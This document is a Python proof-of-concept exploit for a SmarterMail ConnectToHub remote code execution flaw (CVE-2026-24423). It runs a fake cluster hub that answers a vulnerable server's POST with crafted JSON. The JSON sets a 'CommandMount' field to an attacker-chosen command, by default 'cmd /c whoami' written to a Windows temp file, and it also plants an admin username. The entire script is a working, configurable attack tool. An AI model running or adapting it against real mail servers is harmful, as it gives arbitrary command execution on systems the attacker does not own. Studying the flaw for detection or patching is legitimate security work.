#!/usr/bin/env python3
"""Fake SmarterMail Hub for CVE-2026-24423 ConnectToHub RCE"""
from http.server import HTTPServer, BaseHTTPRequestHandler
import json, sys

BIND = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8082
CMD = sys.argv[3] if len(sys.argv) > 3 else r'cmd /c whoami > C:\Windows\Temp\sm_pwn.txt'

class H(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        print(f"[hub] {self.address_string()} {fmt%args}", flush=True)
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        print(f"[hub] path={self.path} body={body[:500]!r}", flush=True)
        resp = {
            "ClusterID": "f0e12780-f462-4b51-a7db-149f1d56209c",
            "SharedSecret": "vulncheck",
            "TargetHubs": {"a": "b"},
            "IsStandby": False,
            "SystemMount": {
                "Enabled": True,
                "ReadOnly": False,
                "MountPath": "C:\\Windows\\Temp\\sm_mount",
                "CommandMount": CMD,
            },
            "SystemAdminUsernames": ["poptart"],
        }
        data = json.dumps(resp).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)
        print(f"[hub] CommandMount sent", flush=True)
    def do_GET(self):
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")

print(f"[*] Hub {BIND}:{PORT} CMD={CMD!r}", flush=True)
HTTPServer((BIND, PORT), H).serve_forever()
